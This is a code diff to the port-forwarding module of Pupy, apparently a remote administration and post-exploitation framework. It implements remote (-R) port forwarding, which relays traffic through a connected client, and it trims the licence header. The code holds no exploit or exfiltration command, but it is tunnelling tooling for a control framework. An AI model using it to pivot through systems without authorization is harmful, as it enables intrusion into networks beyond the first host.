@@ -1,18 +1,6 @@
 # -*- coding: UTF8 -*-
-# --------------------------------------------------------------
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
-# All rights reserved.
-# 
-# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
-# 
-# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
-# 
-# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
-# 
-# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
-# 
-# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
-# --------------------------------------------------------------
+# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 
 from pupylib.PupyModule import *
 import StringIO
@@ -100,6 +88,31 @@ class ThreadedLocalPortFwdServer(SocketServer.ThreadingMixIn, LocalPortFwdServer
 	def __str__(self):
 		return "<LocalPortForward local=%s remote=%s"%(self.server_address,self.remote_address)
 
+def get_remote_port_fwd_cb(remote_addr, local_addr):
+	def func(rsocket):
+		logging.debug("forwarding remote addr %s to local %s "%(remote_addr, local_addr))
+		lsocket=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		lsocket.settimeout(5)
+		try:
+			lsocket.connect(local_addr)
+		except Exception as e:
+			logging.debug("error: %s"%e)
+			if e[0]==10060:
+				logging.debug("unreachable !")
+			rsocket.shutdown(socket.SHUT_RDWR)
+			rsocket.close()
+			return
+		logging.debug("connection succeeded !")
+		sp1=SocketPiper(lsocket, rsocket)
+		sp2=SocketPiper(rsocket, lsocket)
+		sp1.start()
+		sp2.start()
+		sp1.join()
+		sp2.join()
+		logging.debug("conn to %s from %s closed"%(local_addr, remote_addr))
+
+	return func
+
 class PortFwdModule(PupyModule):
 	""" perform local/remote port forwarding using openssh -L/-R syntax """
 	max_clients=1
@@ -149,12 +162,37 @@ class PortFwdModule(PupyModule):
 			t.start()
 			self.success("LOCAL %s:%s forwarded to REMOTE %s:%s"%(local_addr, local_port, remote_addr, remote_port))
 		elif args.remote:
-			#TODO remote port fwd
-			raise NotImplementedError("remote port forwarding is not implemented yet")
+			tab=args.remote.split(':')
+			remote_addr="127.0.0.1"
+			remote_port=None
+			local_addr=None
+			local_port=None
+
+			if len(tab)==3:
+				remote_port, local_addr, local_port = tab
+			elif len(tab)==4:
+				remote_addr, remote_port, local_addr, local_port = tab
+			else:
+				self.error("usage: -R [<REMOTE_ADDR>]:<REMOTE_PORT>:<LOCAL_ADDR>:<LOCAL_PORT>")
+				return
+			try:
+				local_port=int(local_port)
+				remote_port=int(remote_port)
+			except Exception:
+				self.error("ports must be integers")
+				return
+			self.client.load_package("pupyutils.portfwd")
+			remote_server = self.client.conn.modules["pupyutils.portfwd"].ThreadedRemotePortFwdServer((remote_addr, remote_port), callback=get_remote_port_fwd_cb((remote_addr, remote_port),(local_addr, local_port)))
+			self.portfwd_dic[self.current_id]=remote_server
+			self.current_id+=1
+			remote_server.start_serve()
+			self.success("REMOTE %s:%s forwarded to LOCAL %s:%s"%(remote_addr, remote_port, local_addr, local_port))
+
 		elif args.kill:
 			if args.kill in self.portfwd_dic:
 				desc=str(self.portfwd_dic[args.kill])
 				self.portfwd_dic[args.kill].shutdown()
+				self.portfwd_dic[args.kill].server_close()
 				del self.portfwd_dic[args.kill]
 				self.success("%s stopped !"%desc)
 			else:
